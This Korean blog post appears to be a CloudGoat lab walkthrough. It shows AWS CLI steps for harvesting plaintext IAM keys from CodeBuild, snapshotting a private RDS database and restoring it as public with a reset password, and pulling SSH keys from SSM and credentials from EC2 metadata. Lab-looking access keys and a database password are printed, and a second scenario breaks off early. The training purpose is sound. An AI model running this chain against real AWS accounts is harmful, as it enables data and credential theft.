---
emoji: 🤭
title: "클라우드 서비스 취약점 분석 8 (CloudGoat: codebuild_secrets)"
author: Zer0Luck
date: '2021-12-31 13:12:21'
categories: CLOUD
tags: Cloud Vulnerability Security
---
# 클라우드 서비스 취약점 분석 8

# [Scenario 7]:  codebuild_secrets

```bash
Size: Large
Difficulty: Hard
Command: $ ./cloudgoat.py create codebuild_secrets
```

## 시나리오 개요

### 자원

- CodeBuild Project
- Lambda Function
- VPC(RDS, EC2)
- IAM Users

### 취약점

- IAM User Solo
- SSM 파라미터 데이터 탐색후 Security Database에서 하드코딩된 SSH 키가 저장
- IMDS 취약점

### 목표

- RDS Database Storage안에 한 쌍의  Secret Strings을 찾아보자
- Solo IAM 사용자를 이용하여 공격자는 먼저 CodeBuild 프로젝트에 대해 열거를 시작합니다.
- IAM 사용자 `Calrissian` 에 대한 보안이 되지 않은 IAM 키를 찾아 냅니다.
- 공격자는 `Calrissian`으로 작동하여 RDS 데이터베이스를 분석합니다.
- 데이터베이스의 내용에 직접 접근할 수 었는 공격자는 RDS 스냅샷 기능을 이용하여 secret string을 획득 할 수 있습니다.
- 두 번째로는 공격자가 `SSM` 매개 변수를 분석하여 EC2 인스턴스에 대한 SSH키를 찾을 수가 있습니다.
- 메타데이터 서비스를 사용하여 공격자는 EC2 인스턴스 프로필의 키를 획득하고 대상 환경에대한 정보를 열거 합니다. 이를 통해서 원래 데이터베이스에서 Secret String을 획득 합니다.

### exploit 흐름도

![./M33.png](./M33.png)

### 시나리오 환경설정

![Untitled](./0.png)

### exploit 시나리오 흐름도

**RDS Snapshot → env "Calrissian"**

1. IAM 사용자 Solo로서 공격자는 AWS 환경을 분석하고 CodeBuild 프로젝트에 대해 나열할 수가 있습니다.
2. CodeBuild 프로젝트 내에서 공격자는 환경 변수에 지장된 "Calrissian" 에 대한 IAM 키를 검색합니다.
3. "Calrissian" 사용자의 신원을 가정하면 공격자는 RDS 인스턴스를 나열하고 시나리오의 목표가 포함된 개인 데이터베이스를 검색할 수 있습니다.
4. RDS 인스턴스에 직접 액세스 할 수는 없지만 공격자는 해당 인스턴스에서 스냅샷을 생성할 수 있습니다.
5. 그런 다음 공격자는 스냅샷에서 새로운 RDS 인스턴스를 생성할 수 있습니다.
6. 새로 생성된 RDS 인스턴스의 관리자 암호를 재설정해서 공격자는 자신에게 해당하는 콘테츠에 대한 액세스 권한을 부여할 수 있습니다.
7. 복원된 RDS 데이터베이스에 로그인한 후 공격자는 Secret String을 얻을 수 있게 됩니다.

**EC2 Metadata service**

- Solo IAM 사용자 에 대한 AWS Credential과 해당 환경을 분석하면서 `SSM` 매개 변수를 나열할 수있음을 확인할 수 있습니다.
- 공격자는 계정에 속하는 `SSM` 매개변수 중 암호화 없이 저장된 SSH key-pair를 찾습니다.
- 공격자는 EC2 인스턴스를 나열하고 찾은 SSH key를 사용할 벡터를 찾습니다.
- 계정에서 EC2 인스턴스를 발견한후 공격자는 EC2 인스턴스에 성공적으로 연결을 합니다.

**EC2 Metadata Service를 Exploit하여 DB 정보를 가져온다.**

- 쉘로 액세스하여 작업하면서 공격자는 EC2 메타데이터 서비스를 대상으로 쿼리를 하여 인스턴스 프로필 IAM 키를 검색합니다.
- EC2 인스턴스의 프로필 정보를 토대로 공격자는 Lambda 함수를 열거할 수 있습니다.
- 공격자는 Lambda 환경 변수에 안전하지 않게 저장된 RDS 데이터베이스에 대한 관리자 Credential을 검색합니다.
- EC2 인스턴스의 프로필을 사용하는 공격자는 RDS 데이터베이스를 나열하고 액세스하며 발견한 관리자 Credential을 사용하여 로그인을 할 수 있습니다.
- RDS 데이터베이스에 대한 전체 액세스 권한이 있는 공격자 시나리오의 목표인 Security String을 복구할 수 있습니다.

**EC2 Metadata Service를 Exploit하여 EC2 role, IAM key 정보들을 가져온다.**

- 쉘로 액세스하여 작업하면서 공격자는 EC2 Metadata Service에 대해 쿼리하고 데이터베이스 주소가 관리자 Credential과 함께 저장되어 있음을 발견할 수 있습니다.
- EC2 메타데이터 서비스에서 복구된 RDS Credential, Address를 사용하여 공격자는 RDS 데이터베이스에 직접 로그인할 수 있습니다.
- RDS 데이터베이스에 대한 full-access 권한이 있는 공격자는 Security String을 복구할 수 있습니다.

## Exploit 시나리오

**AWS Code Build**

- 소스 코드를 컴파일하는 단계부터 테스트 실행 후 소프트웨어 패키지를 개발하여 배포하는 단계까지 마칠 수 있는 완전 관리형의 지속적 통합 서비스입니다.
- Code Build를 사용하면 자체 빌드 서버를 프로비저닝, 관리 및 확장할 필요가 없습니다.
- CodeBuild는 지속적으로 확장되고 여러 빌드를 도시에 처리하기 때문에 빌드가 대기열에서 대기하지 않고 바로 처리됩니다.
- 사전 패키딩된 빌드 환경을 사용하면 신속하게 시작할 수 있습니다.
- 빌드 시간 100분 무료 (`build.general1.small` computing) 와우

### IAM Solo 사용자의 AWS Credential 정보 노출

```python
cloudgoat_output_aws_account_id = "111111111111"
cloudgoat_output_solo_access_key_id = <ACCESS_KEY>
cloudgoat_output_solo_secret_key = <sensitive>

[cloudgoat] terraform apply completed with no error code.

[cloudgoat] terraform output completed with no error code.
cloudgoat_output_aws_account_id = 111111111111
cloudgoat_output_solo_access_key_id = <ACCESS_KEY>
cloudgoat_output_solo_secret_key = <sensitive>
```

- 노출된 AWS Credentials 정보를 토대로 사용할 수 있는 권한이 무엇이 있는지 열거하였습니다.

![Untitled](./1.png)

- IAM 사용자 Solo의 사용 권한을 확인해 보면 `EC2, CodeBuild, RDS, S3` 권한이 있는 것을 확인할 수 있습니다.

### IAM User : Solo, CodeBuild Project 권한 열거

- `CodeBuild` 관련 권한을 상용하여 쓸 수 있는 권한을 진행하였습니다. "Solo"가 접근할 수 있는 모든 CodeBuild 프로젝트를 나열하였습니다.

![Untitled](./2.png)

- 확인한 결과 CodeBuild Project가 하나 있는 것을 확인할 수 있습니다.
- 해당 빌드 프로젝트와 관련된 정보를 더 검색보도록 하겠습니다.

```python
aws codebuild batch-get-projects --names cg-codebuild-codebuild_secrets_cgidq5cx1pvldn --profile solo
```

- CodeBuild Projects에 관련된 여러 정보들을 확인할 수 가 있는데 이중에서 환경변수에 관련된 정보만을 추출하기 위해서 query를 주고 다시 검색을 하였습니다.

```python
{
    "projects": [
        {
            "name": "cg-codebuild-codebuild_secrets_cgidq5cx1pvldn",
            "arn": "arn:aws:codebuild:us-east-1:<USERID>:project/cg-codebuild-codebuild_secrets_cgidq5cx1pvldn",
            "source": {
                "type": "NO_SOURCE",
                "gitCloneDepth": 0,
                "buildspec": "version: 0.2\n\nphases:\n  pre_build:\n    commands:\n      - echo \"This is CloudGoat's simpliest buildspec file ever (maybe)\"",
                "insecureSsl": false
            },
            "artifacts": {
                "type": "NO_ARTIFACTS",
                "overrideArtifactName": false
            },
            "cache": {
                "type": "NO_CACHE"
            },
            "environment": {
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/standard:1.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "calrissian-aws-access-key",
                        "value": "AKIA2MALBVI56TKO4VUB",
                        "type": "PLAINTEXT"
                    },
                    {
                        "name": "calrissian-aws-secret-key",
                        "value": "WFxne/U4OouOXcvgeBeiE69VaRWm6wQeBCf4IcXI",
                        "type": "PLAINTEXT"
                    }
                ],
                "privilegedMode": false,
                "imagePullCredentialsType": "CODEBUILD"
            },
            "serviceRole": "arn:aws:iam::<USERID>:role/code-build-cg-codebuild_secrets_cgidq5cx1pvldn-service-role",
            "timeoutInMinutes": 20,
            "queuedTimeoutInMinutes": 480,
            "encryptionKey": "arn:aws:kms:us-east-1:<USERID>:alias/aws/s3",
            "tags": [
                {
                    "key": "Name",
                    "value": "cg-codebuild-codebuild_secrets_cgidq5cx1pvldn"
                },
                {
                    "key": "Scenario",
                    "value": "codebuild-secrets"
                },
                {
                    "key": "Stack",
                    "value": "CloudGoat"
                }
            ],
            "created": "2021-08-15T01:09:23.349000+09:00",
            "lastModified": "2021-08-15T01:09:23.349000+09:00",
            "badge": {
                "badgeEnabled": false
            },
            "logsConfig": {
                "cloudWatchLogs": {
                    "status": "ENABLED"
                },
                "s3Logs": {
                    "status": "DISABLED",
                    "encryptionDisabled": false
                }
            }
        }
    ],
    "projectsNotFound": []
}
```

```python
aws codebuild batch-get-projects --names cg-codebuild-codebuild_secrets_cgidq5cx1pvldn --query "projects[*].environment" --profile solo
```

![Untitled](./3.png)

- CodeBuild Projects 세부 정보를 열거하는 동안 CodeBuild Project의 환경 변수에 IAM 사용자를 보면 `calrissian` 이라는 명칭을 확인할 수 있습니다.
- IAM Security Credential이 있음을 확인할 수 있고 해당 Credential 을 볼려면 이를 사용하는 Profile을 다시 생성하고 확인을 해야 합니다.

### IAM User: calrissian Profile 등록 및 권한 열거

```python
"environmentVariables": [
            {
                "name": "calrissian-aws-access-key",
                "value": "AKIA2MALBVI56TKO4VUB",
                "type": "PLAINTEXT"
            },
            {
                "name": "calrissian-aws-secret-key",
                "value": "WFxne/U4OouOXcvgeBeiE69VaRWm6wQeBCf4IcXI",
                "type": "PLAINTEXT"
            }
        ],
```

![Untitled](./4.png)

- 다음과 같이 프로필을 등록해주고 사용할 수 있는 권한이 무엇이 있는지 열거해보겠습니다.

![Untitled](./5.png)

- IAM User, "calrissian"은 "EC2, "RDS" 관련 권한이 있는 것을 확인할 수 있으며 RDS 인스턴스가 있는지를 확인해보았습니다.

```python
aws rds describe-db-instances --query "DBInstances[*].[DBInstanceIdentifier, Engine , DBName]" --output text --profile calrissian
```

![Untitled](./6.png)

```python
cg-rds-instance-codebuild-secrets-cgidq5cx1pvldn        postgres        securedb
```

- AWS 계정에서 `postgreSQL` 을 사용하는 RDS 인스턴스가 존재는 하지만 Public 형태로 접근이 불가능하기 불가능하지만 해당 database 명을 보면 `securedb` 명칭되어 있어 맛있어 보입니다.

### RDS Instance SnapShot

**Database Snapshopt 기능**

- AWS RDS는 개별 데이터베이스가 아닌 전체 DB 인스턴스를 백업하여 DB 인스턴스의 스토리지 볼륨 스냅샷을 생성합니다.
- 단인 AZ DB 인스턴스에서 해당 DB 스냅샷을 생성하면 잠시 I/O 가 중단되는데 해당 DB 인스턴스의 크기 및 클래스에 따라 대체로 몇 초에서 몇 분 정도 지속되어집니다.
- `MariaDB, MySQL, Oracle, PostgreSQL...` 의 경우 다중 AZ 배포에 대한 백업 시 기본 AZ에서는 I/O 작업이 중단이 되질 않습니다.
- PostgreSQL DB 인스턴스의 겨우 로그되지 않은 테이블의 데이터가 스냅샷에서 복원되지 않을 수 있습니다.

```python
aws rds create-db-snapshot --db-snapshot-identifier secrets-snapshot --db-instance-identifier cg-rds-instance-codebuild-secrets-cgidq5cx1pvldn --profile calrissian
```

- 실행 중인 RDS Instance의 snapshot을 생성한 다음 해당 스냅샷을 제어할 수 있든 또 다른 RDS 인스턴스를 생성하고 여기서 Security를 추출해 보겠습니다.
- 스냅샷에서 RDS 인스턴스를 생성한 후 Public으로 생성한 RDS 인스턴스에 액세스할 수 있으려면 적절한 Subnet과 보안 그룹에 배치되어야 합니다.

![Untitled](./7.png)

```python
{
    "DBSnapshot": {
        "DBSnapshotIdentifier": "secrets-snapshot",
        "DBInstanceIdentifier": "cg-rds-instance-codebuild-secrets-cgidq5cx1pvldn",
        "Engine": "postgres",
        "AllocatedStorage": 20,
        "Status": "creating",
        "Port": 5432,
        "AvailabilityZone": "us-east-1b",
        "VpcId": "vpc-0449676f4c03795ea",
        "InstanceCreateTime": "2021-08-14T16:13:44.812000+00:00",
        "MasterUsername": "cgadmin",
        "EngineVersion": "9.6.22",
        "LicenseModel": "postgresql-license",
        "SnapshotType": "manual",
        "OptionGroupName": "default:postgres-9-6",
        "PercentProgress": 0,
        "StorageType": "gp2",
        "Encrypted": false,
        "DBSnapshotArn": "arn:aws:rds:us-east-1:<USERID>:snapshot:secrets-snapshot",
        "IAMDatabaseAuthenticationEnabled": false,
        "ProcessorFeatures": [],
        "DbiResourceId": "db-3MLI3HBAAWNMRIHBDXYVCHUIWQ",
        "TagList": []
    }
}
```

- 실행 중인 RDS 인스턴스의 서브넷 그룹을 식별해 보기 위해서 서브넷 그룹 이름을 기록해 둡니다.

```python
aws rds describe-db-subnet-groups --query "DBSubnetGroups[?contains(DBSubnetGroupName,'rds')]" --profile calrissian
```

```python
[
    {
        "DBSubnetGroupName": "cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn",
        "DBSubnetGroupDescription": "CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group",
        "VpcId": "vpc-0449676f4c03795ea",
        "SubnetGroupStatus": "Complete",
        "Subnets": [
            {
                "SubnetIdentifier": "subnet-0bb58f8e0a0abe565",
                "SubnetAvailabilityZone": {
                    "Name": "us-east-1b"
                },
                "SubnetOutpost": {},
                "SubnetStatus": "Active"
            },
            {
                "SubnetIdentifier": "subnet-0bce9dc9a764b6a13",
                "SubnetAvailabilityZone": {
                    "Name": "us-east-1a"
                },
                "SubnetOutpost": {},
                "SubnetStatus": "Active"
            }
        ],
        "DBSubnetGroupArn": "arn:aws:rds:us-east-1:<USERID>:subgrp:cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn"
    },
    {
        "DBSubnetGroupName": "cloud-goat-rds-testing-subnet-group-codebuild_secrets_cgidq5cx1pvldn",
        "DBSubnetGroupDescription": "CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group ONLY for Testing with Public Subnets",
        "VpcId": "vpc-0449676f4c03795ea",
        "SubnetGroupStatus": "Complete",
        "Subnets": [
            {
                "SubnetIdentifier": "subnet-0845f795b2db8e806",
                "SubnetAvailabilityZone": {
                    "Name": "us-east-1b"
                },
                "SubnetOutpost": {},
                "SubnetStatus": "Active"
            },
            {
                "SubnetIdentifier": "subnet-08eae70434942222f",
                "SubnetAvailabilityZone": {
                    "Name": "us-east-1a"
                },
                "SubnetOutpost": {},
                "SubnetStatus": "Active"
            }
        ],
        "DBSubnetGroupArn": "arn:aws:rds:us-east-1:<USERID>:subgrp:cloud-goat-rds-testing-subnet-group-codebuild_secrets_cgidq5cx1pvldn"
    }
]
```

- RDS 서비스와 통신할 수 있는 보안 그룹이 있는지 확인을 해보도록 하겠습니다.

```python
aws ec2 describe-security-groups --query "SecurityGroups[?contains(Description,'RDS')]" --profile calrissian
```

```python
[
    {
        "Description": "CloudGoat codebuild_secrets_cgidq5cx1pvldn Security Group for PostgreSQL RDS Instance",
	        "GroupName": "cg-rds-psql-codebuild_secrets_cgidq5cx1pvldn",
        "IpPermissions": [
            {
                "FromPort": 5432,
                "IpProtocol": "tcp",
                "IpRanges": [
                    {
                        "CidrIp": "10.10.20.0/24"
                    },
                    {
                        "CidrIp": "10.10.30.0/24"
                    },
                    {
                        "CidrIp": "10.10.40.0/24"
                    },
                    {
                        "CidrIp": "10.10.10.0/24"
                    },
                    {
                        "CidrIp": "124.50.41.21/32"
                    }
                ],
                "Ipv6Ranges": [],
                "PrefixListIds": [],
                "ToPort": 5432,
                "UserIdGroupPairs": []
            }
        ],
        "OwnerId": "<USERID>",
        "GroupId": "sg-08cf0063172ca84b3",
        "IpPermissionsEgress": [
            {
                "IpProtocol": "-1",
                "IpRanges": [
                    {
                        "CidrIp": "0.0.0.0/0"
                    }
                ],
                "Ipv6Ranges": [],
                "PrefixListIds": [],
                "UserIdGroupPairs": []
            }
        ],
        "VpcId": "vpc-0449676f4c03795ea"
    }
]
```

- Public으로 접근할 수 있도록 스냅샷에서 RDS 인스턴스를 생성하는 데 필요한 모든 정보를 수집했습니다.
- 스냅샷에서 RDS 인스턴스를 생성해 보겠습니다.

```python
db-subnet-group-name : cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn
vpc-security-group-name : "GroupId": "sg-08cf0063172ca84b3",

aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier secrets-instance \
    --db-snapshot-identifier secrets-snapshot \
    --db-subnet-group-name cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn  \
    --publicly-accessible \
    --vpc-security-group-ids sg-08cf0063172ca84b3 \
    --profile calrissian
```

- RDS 스냅 샷을 생성한후 해당 로그를 통해서 필요한 부분을 분석하도록 하겠습니다.

```python
{
    "DBInstance": {
        "DBInstanceIdentifier": "secrets-instance",
        "DBInstanceClass": "db.t2.micro",
        "Engine": "postgres",
        "DBInstanceStatus": "creating",
        "MasterUsername": "cgadmin",
        "DBName": "securedb",
        "AllocatedStorage": 20,
        "PreferredBackupWindow": "05:44-06:14",
        "BackupRetentionPeriod": 0,
        "DBSecurityGroups": [],
        "VpcSecurityGroups": [
            {
                "VpcSecurityGroupId": "sg-08cf0063172ca84b3",
                "Status": "active"
            }
        ],
        "DBParameterGroups": [
            {
                "DBParameterGroupName": "default.postgres9.6",
                "ParameterApplyStatus": "in-sync"
            }
        ],
        "DBSubnetGroup": {
            "DBSubnetGroupName": "cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn",
            "DBSubnetGroupDescription": "CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group",
            "VpcId": "vpc-0449676f4c03795ea",
            "SubnetGroupStatus": "Complete",
            "Subnets": [
                {
                    "SubnetIdentifier": "subnet-0bb58f8e0a0abe565",
                    "SubnetAvailabilityZone": {
                        "Name": "us-east-1b"
                    },
                    "SubnetOutpost": {},
                    "SubnetStatus": "Active"
                },
                {
                    "SubnetIdentifier": "subnet-0bce9dc9a764b6a13",
                    "SubnetAvailabilityZone": {
                        "Name": "us-east-1a"
                    },
                    "SubnetOutpost": {},
                    "SubnetStatus": "Active"
                }
            ]
        },
        "PreferredMaintenanceWindow": "fri:04:45-fri:05:15",
        "PendingModifiedValues": {},
        "MultiAZ": false,
        "EngineVersion": "9.6.22",
        "AutoMinorVersionUpgrade": true,
        "ReadReplicaDBInstanceIdentifiers": [],
        "LicenseModel": "postgresql-license",
        "OptionGroupMemberships": [
            {
                "OptionGroupName": "default:postgres-9-6",
                "Status": "pending-apply"
            }
        ],
        "PubliclyAccessible": true,
        "StorageType": "gp2",
        "DbInstancePort": 0,
        "StorageEncrypted": false,
        "DbiResourceId": "db-HJPNEAUX3WEQDCJQVIVYK4NWLI",
        "CACertificateIdentifier": "rds-ca-2019",
        "DomainMemberships": [],
        "CopyTagsToSnapshot": false,
        "MonitoringInterval": 0,
        "DBInstanceArn": "arn:aws:rds:us-east-1:<USERID>:db:secrets-instance",
        "IAMDatabaseAuthenticationEnabled": false,
        "PerformanceInsightsEnabled": false,
        "DeletionProtection": false,
        "AssociatedRoles": [],
        "TagList": [
            {
                "Key": "Name",
                "Value": "cg-rds-instance-codebuild_secrets_cgidq5cx1pvldn"
            },
            {
                "Key": "Scenario",
                "Value": "codebuild-secrets"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            }
        ],
        "CustomerOwnedIpEnabled": false
    }
}
```

- 이제 마음대로 조절가능한 RDS 인스턴스가 생겼으니 해당 데이터베이스의 마스터 사용자 암호를 재설정하겠습니다. 분석하기 편하게 cloudgoat로 지정을 하도록 하겠습니다.

```python
aws rds modify-db-instance \
    --db-instance-identifier secrets-instance \
    --master-user-password cloudgoat \
    --profile calrissian
```

```python
{
    "DBInstance": {
        "DBInstanceIdentifier": "secrets-instance",
        "DBInstanceClass": "db.t2.micro",
        "Engine": "postgres",
        "DBInstanceStatus": "available",
        "MasterUsername": "cgadmin",
        "DBName": "securedb",
        "Endpoint": {
            "Address": "secrets-instance.cklw91kahwum.us-east-1.rds.amazonaws.com",
            "Port": 5432,
            "HostedZoneId": "Z2R2ITUGPM61AM"
        },
        "AllocatedStorage": 20,
        "InstanceCreateTime": "2021-08-14T18:40:41.128000+00:00",
        "PreferredBackupWindow": "05:44-06:14",
        "BackupRetentionPeriod": 0,
        "DBSecurityGroups": [],
        "VpcSecurityGroups": [
            {
                "VpcSecurityGroupId": "sg-08cf0063172ca84b3",
                "Status": "active"
            }
        ],
        "DBParameterGroups": [
            {
                "DBParameterGroupName": "default.postgres9.6",
                "ParameterApplyStatus": "in-sync"
            }
        ],
        "AvailabilityZone": "us-east-1a",
        "DBSubnetGroup": {
            "DBSubnetGroupName": "cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn",
            "DBSubnetGroupDescription": "CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group",
            "VpcId": "vpc-0449676f4c03795ea",
            "SubnetGroupStatus": "Complete",
            "Subnets": [
                {
                    "SubnetIdentifier": "subnet-0bb58f8e0a0abe565",
                    "SubnetAvailabilityZone": {
                        "Name": "us-east-1b"
                    },
                    "SubnetOutpost": {},
                    "SubnetStatus": "Active"
                },
                {
                    "SubnetIdentifier": "subnet-0bce9dc9a764b6a13",
                    "SubnetAvailabilityZone": {
                        "Name": "us-east-1a"
                    },
                    "SubnetOutpost": {},
                    "SubnetStatus": "Active"
                }
            ]
        },
        "PreferredMaintenanceWindow": "fri:04:45-fri:05:15",
        "PendingModifiedValues": {
            "MasterUserPassword": "****"
        },
        "MultiAZ": false,
        "EngineVersion": "9.6.22",
        "AutoMinorVersionUpgrade": true,
        "ReadReplicaDBInstanceIdentifiers": [],
        "LicenseModel": "postgresql-license",
        "OptionGroupMemberships": [
            {
                "OptionGroupName": "default:postgres-9-6",
                "Status": "in-sync"
            }
        ],
        "PubliclyAccessible": true,
        "StorageType": "gp2",
        "DbInstancePort": 0,
        "StorageEncrypted": false,
        "DbiResourceId": "db-HJPNEAUX3WEQDCJQVIVYK4NWLI",
        "CACertificateIdentifier": "rds-ca-2019",
        "DomainMemberships": [],
        "CopyTagsToSnapshot": false,
        "MonitoringInterval": 0,
        "DBInstanceArn": "arn:aws:rds:us-east-1:<USERID>:db:secrets-instance",
        "IAMDatabaseAuthenticationEnabled": false,
        "PerformanceInsightsEnabled": false,
        "DeletionProtection": false,
        "AssociatedRoles": [],
        "TagList": [
            {
                "Key": "Name",
                "Value": "cg-rds-instance-codebuild_secrets_cgidq5cx1pvldn"
            },
            {
                "Key": "Scenario",
                "Value": "codebuild-secrets"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            }
        ],
        "CustomerOwnedIpEnabled": false
    }
}
```

- 마스터 사용자 암호를 설정한 후에 데이터베이스에 연결하고 Security String을 추출하기 위해 필요한 새로운 RDS 인스턴스에 대한 정보를 검색하였습니다.

![Untitled](./8.png)

- 이제 RDS 인스턴스에  연결하는데 있어서 필요한 모든 정보를 수집하였고 PostgreSQL 클라이언트를 사용하여 데이터베이스에 연결하고 비밀을 추출할 수 있습니다.
- 해당 경우 `psql` 명령줄을 통해서 `postgreSQL` 클라이언트를 사용합니다. 앞에서 했던 방식으로 db 에 연결을 한 후 테이블을 조회하여 원하는 정보를 추출합니다.

```python
psql -h [INSTANCE-PUBLIC-DNS-NAME] -p 5432 -d securedb -U cgadmin

psql -h secrets-instance.cklw91kahwum.us-east-1.rds.amazonaws.com -p 5432 -d securedb -U cgadmin
```

![Untitled](./9.png)

### SSM:DescribeParameters

- 앞에서 했던 방식과 다른 접근을 해보고자 합니다.
- 일단은 제일 먼저 하는 Credential 정보를 통해서 사용가능한 권한이 무엇인지를 체크를 해야겠죠
- `SSM:DescribeParameters` 권한을 소유하고 있는 것을 확인할 수 있습니다. 해당 권한은 IAM Crednential이 AWS System Manager Parameter Store에 저장된 파라미터를 나열 할 수 있도록 허용합니다.
- 설계상 저장된 대부분의 매개변수는 취약합니다.

![Untitled](./10.png)

- AWS 계정의 Parameter Store에 있는 모든 파라미터들을 나열하였습니다.
- Parameter Store에 EC2 SSH key-pair로 추정되는 `cg-ec2-private-key-codebuild_secrets_cgidq5cx1pvldn` 가 있음을 확인할 수 있스니다.

```python
aws ssm get-parameter \
    --name cg-ec2-private-key-codebuild_secrets_cgidq5cx1pvldn \
    --query "Parameter.Value" \
    --output text \
    --profile solo
```

- `Paramteter.value` 를 대상으로 쿼리를 잡고 ssh private key 값을 추출 하겠습니다.

![Untitled](./11.png)

- 다음과 같이 해당 개인 키를 다운르도 할 수 가 있고 이 키를 사용할 수 있는 AWS 계정에서 EC2 인스턴스가 있는지 확인하였습니다.

![Untitled](./12.png)

- EC2 인스턴스가 동작하고 있는 것을 확인할 수 있으며 이를 토대로 SSH 로 접속을 시도 해 보겠습니다.

![Untitled](./13.png)

- 서버에 접속되는 것을 확인할 수 있습니다.

### IMDS 서비스를 이용한 열거

- EC2 인스턴스에 접근이 가능하기 때문에 IMDS 서비스를 사용하여 추가적으로 열거가 가능합니다.
- IMDS 를 사용하여 EC2인스턴스를 시작할 떄 지정된 사용자 데이터에 액세스가 가능합니다.
- 사용자 데이터에는 중요 정보가 포함된는 경우가 대다수 입니다.

![Untitled](./14.png)

- 링크 주소를 이용하여 EC2의 사용자 데이터에는 EC2 인스턴스에서 RDS 인스터에 연결하기 위한 명령들의 집합이 포함되어 있고
- 해당 명령에는 RDS 인스턴스에 대한 Crendentail이 포함되어 있습니다.

### IMDS 를 이용한 IAM Crendentail 탈취

- EC2 인스턴스에 대한 액세스 권한을 얻은 경우 IMDS 서비스를 사용하여 IAM 자격 증명을 훔치는 것입니다.
- IAM Rule 을 EC2 인스턴스에 연결하는 것이 가장 일반적입니다.
- IAM Rule 을 사용하여 EC2 인스턴스는 AWS 계정의 다른 AWS 서비스와 상호 작용을 할 수 있습니다
- 만약에 과도한 권한 이 부여되어있다면 이를 이용하여 권한 상승이 가능합니다.

![Untitled](./15.png)

- 탈취한 IAM Rule Credentail 은 다른 IAM Creadentail 처럼 사용할 수있습니다.
- 해당 Rule credential을 사용하여 수행할 수 있는 작업들을 열거하기 위해 AWS 프로파일을 생성하였습니다.

```python
{
  "Code" : "Success",
  "LastUpdated" : "2021-08-14T20:45:23Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "<ACCESS_KEY>",
  "SecretAccessKey" : "<ACCESS_SECRET_KEY>",
  "Token" : "<ACCESS_SESSION_KEY>",
  "Expiration" : "2021-08-15T03:11:47Z"
```

![Untitled](./16.png)

- 사용 가능한 정책들 중에서 `lambda` 관련 권한이 있는 것을 확인할 수 있고 해당 서비스를 나열하였습니다.

![Untitled](./17.png)

- 대상 RDS 인스턴스에 연결하는 데 필요한 모든 정보가 있으므로 Postgresql 클라이언트를 사용해서 데이터베이스에 연결하고 String Security를 추출할 수있습니다.

```python

"DB_USER": "cgadmin",
"DB_NAME": "securedb",
"DB_PASSWORD": "wagrrrrwwgahhhhwwwrrggawwwwwwrr"
```

# [Scenario 8]:  ecs_efs_attack

```bash
Size: Large
Difficulty: Hard
Command: $ ./cloudgoat.py create ecs_efs_attack
```

## 시나리오 개요

### 자원

- vpc (EC2*2, ECS Cluster, Service, EFS)

### 취약점

- EC2 Ruse_box에 SSH로 접속
- IAM Role에 대한 환경 노출 및 접근
- Instance Tag 기반의 정책에 대한 Tag 수정
- ECS 클러스터에 컨테이너 배포시 Fargate를 이용한 무효 작업

### 목표

- `cg-efs-cg_id` efs를 마운트하고 flag 획득
- user는 `ruse` ec2에 SSH 액세스를 할 수 있으며 인스턴스 프로파일을 활용하여 실행 중인 ECS Container를 백도어를 합니다.
- Backdoor Container를 사용하여 공격자는 Container Metadata API에서 AWS Credential을 검색합니다.해당 Credential 을 통해서 공격자가 적절한 권한이 설정된 모든 EC2 세션을 시작할 수있습니다.
- 공격자는 권한을 남용하여 Admin EC2에서 태그를 변경한후 세션을 시작합니다.
- Admin EC2에 접속한 이상 공격자는 마운트할 Open EFS에 대해 Subnet PortScan을 진행합니다.
- 이를 이용하여 공격자는 파일 시스템에서 플래그를 검색할 수 있게 됩니다.

### exploit 흐름도

![./M26.png](./M26.png)

### 시나리오 환경설정

![Untitled](./18.png)

### exploit 시나리오 흐름도

- Ruse_box ec2에 제공된 SSH 액세스키를 사용하여 액세스 합니다.
- ec2 에 대한 권한 열거를 통해서 사용 가능한 ec2를 나열하고 캐그가 구성되는 방식을 확인하였습니다.
- 현재 ec2에서 기존의 ecs 클러스터를 열거하고 기존 작업에 해당 하는 부분을 백도어 합니다.
- ecs 클러스터의 기존 서비스를 업데이트해서 페이로드를 실행합니다.
- Container Credential에서 `SSM:StartSession` 권한을 사용해서 `admin_box`에 액세스를 합니다
- Subnet portScan을 사용해서 ef, mount를 찾습니다.

## Exploit 시나리오

### ruse EC2 SSH 접속

```python
cloudgoat_output_aws_account_id = "<USERID>"
ruse_box_IP = "18.215.179.159"
ssh_command = "ssh -i cloudgoat ubuntu@\\18.215.179.159"

[cloudgoat] terraform apply completed with no error code.

[cloudgoat] terraform output completed with no error code.
cloudgoat_output_aws_account_id = <USERID>
ruse_box_IP = 18.215.179.159
ssh_command = ssh -i cloudgoat ubuntu@\18.215.179.159
```

![Untitled](./19.png)

- ssh 키와 접속 가능한 ruse_box EC2 서버 IP 정보를 토대로 해당 서버에 접근이 가능합니다.

### EC2 Instance Profile 구성및 정보 나열

![Untitled](./20.png)

- Instance profile 구성시 구성된 키, 암호가 없기 떄문에 구성이 완료된다면 IAM 권한 나열을 진행합니다.
- `get-caller-identity` 를 시도하면 해당 default 한 상태에서의 리소스에 대한 정보를 식별할 수 있으며 여기서 `cg-ec2-role-ecs_efs_attack_cgidzng5qpdu9q` 정책 이름을 이용하여 해당 role에 접ㅣ 가능한 정책들을 나열하였습니다.

![Untitled](./21.png)

- 전체적으로 구성이 완료된다면 해당 IAM 권한들에 대해서 나열이 가능하며 AWS 관리형 정책과 `cg-ec2-ruse-policy-cgid` 를 성생한 다른 사용자들의 두 가지 정책을 확인할 수  있었고 해당 사용자 지정 정책을 확인하고자 `arn:aws:iam::<USERID>:policy/cg-ec2-ruse-role-policy-ecs_efs_attack_cgidzng5qpdu9q` 해당 리소스 정보에 대한 정책 버전 정보를 나열하였습니다.

